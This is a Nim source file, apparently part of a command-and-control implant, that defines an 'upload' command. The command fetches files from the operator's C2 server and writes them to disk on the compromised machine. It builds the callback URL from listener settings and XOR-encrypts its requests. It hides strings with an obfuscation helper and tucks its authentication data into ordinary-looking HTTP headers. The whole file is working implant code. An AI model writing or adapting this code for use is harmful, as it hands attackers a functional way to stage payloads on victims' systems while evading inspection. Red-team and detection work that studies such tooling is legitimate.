#[
    Cross-Platform upload Command
    Download files from C2 server to implant (upload from implant perspective)
    Compatible with Linux, macOS, and other Unix-like systems
]#

import httpclient, strutils, os, base64
import ../../util/strenc
import ../../util/crypto
import ../../core/webClientListener

proc upload*(li: webClientListener.Listener, cmdGuid: string, args: seq[string]): string =
    try:
        if args.len < 1 or args.len > 2:
            return obf("ERROR: upload requires one or two arguments.\nUsage: upload <remote_file> [local_destination]")
        
        let remoteFile = args[0]
        let localDest = if args.len == 2: args[1] else: extractFilename(remoteFile)
        
        if localDest == "":
            return obf("ERROR: Could not determine local filename. Please specify a destination.")
        
        when defined verbose:
            echo obf("DEBUG: Downloading file from C2: ") & remoteFile & obf(" -> ") & localDest
        
        # Build C2 download URL
        var downloadUrl = li.listenerType.toLowerAscii() & "://"
        if li.listenerHost != "":
            downloadUrl = downloadUrl & li.listenerHost
        else:
            downloadUrl = downloadUrl & li.implantCallbackIp & ":" & li.listenerPort
        downloadUrl = downloadUrl & li.taskPath & "/d"
        
        # Create HTTP client
        var client = newHttpClient()
        client.headers = newHttpHeaders()
        client.headers["User-Agent"] = li.userAgent
        client.headers["X-Request-ID"] = li.id
        client.headers["Content-MD5"] = cmdGuid  # Task GUID
        client.headers["X-Correlation-ID"] = li.httpAllowCommunicationKey
        client.headers["Content-Type"] = "application/json"
        
        # Send request for file
        let requestBody = "{\"file\":\"" & remoteFile & "\"}"
        let encryptedRequest = encryptData(requestBody, li.UNIQUE_XOR_KEY)
        
        let response = client.post(downloadUrl, encryptedRequest)
        
        when defined verbose:
            echo obf("DEBUG: Download response status: ") & response.status
        
        if not response.status.startsWith("200"):
            client.close()
            return obf("ERROR: Download failed with status: ") & response.status
        
        # Decrypt and decode file content
        let decryptedResponse = decryptData(response.body, li.UNIQUE_XOR_KEY)
        
        try:
            let fileContent = base64.decode(decryptedResponse)
            
            # Create parent directory if needed
            let parentDir = parentDir(localDest)
            if parentDir != "" and not dirExists(parentDir):
                createDir(parentDir)
            
            # Write file to disk
            writeFile(localDest, fileContent)
            
            client.close()
            
            when defined verbose:
                echo obf("DEBUG: File written successfully, size: ") & $fileContent.len & obf(" bytes")
            
            return obf("File downloaded successfully from C2 server:\n") &
                   obf("Remote: ") & remoteFile & "\n" &
                   obf("Local: ") & localDest & "\n" &
                   obf("Size: ") & $fileContent.len & obf(" bytes")
                   
        except:
            client.close()
            return obf("ERROR: Failed to decode file content - invalid response format")
        
    except Exception as e:
        when defined verbose:
            echo obf("DEBUG: upload failed: ") & e.msg
        return obf("ERROR: File download failed - ") & e.msg